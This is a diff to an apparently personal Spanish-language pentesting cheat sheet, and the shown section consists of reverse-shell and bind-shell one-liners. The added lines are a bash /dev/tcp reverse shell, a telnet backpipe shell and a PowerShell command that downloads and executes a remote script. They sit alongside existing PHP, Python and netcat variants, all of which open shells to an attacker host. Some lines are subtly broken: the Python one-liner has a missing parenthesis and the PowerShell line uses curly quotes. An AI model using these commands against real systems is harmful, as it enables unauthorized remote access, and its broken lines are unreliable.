@@ -40,6 +40,7 @@ SNMP ->
 Reverse shell
     Recibida con nc -vvv -n -l -p PUERTO
     bash -i >& /dev/tcp/IP_DESTINO/NUM_PUERTO 0>&1
+    bash -c "bash -i >& /dev/tcp/IP Atacante/Puerto Atacante 0>&1"
     ---
     Para RCE en web
     mknod /tmp/backpipe p
@@ -49,6 +50,7 @@ Reverse shell
     O también (bind)
     mkfifo /tmp/rfsfu; (nc -l -p 3000 || nc -l 3000)0</tmp/rfsfu | /bin/sh >/tmp/rfsfu 2>&1; rm /tmp/rfsfu
     ---
+    mknod backpipe p && telnet IP_Atacante Puerto_Atacante 0<backpipe | /bin/bash 1>backpipe
     php -r '$sock=fsockopen("IP",Puerto);exec("/bin/sh -i <&3 >&3 2>&3");'
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",Port));os.dup2(s.fileno(),0;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
     0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196&		(el & final la pone en background)
@@ -56,6 +58,7 @@ Reverse shell
 
 	WINDOWS:
 		powershell "IEX (New-Object Net.WebClient).downloadString('http://IP:PUERTO/SHELL')"
+		powershell -c "IEX(New-Object System.Net.WebClient).DownloadString (‘http://IP/p.ps1’); p.ps1 -c IP -p PORT -e cmd"
 
 Conectarse por mysql
 	mysql -uUSUARIO -pPASSWORD -h HOST
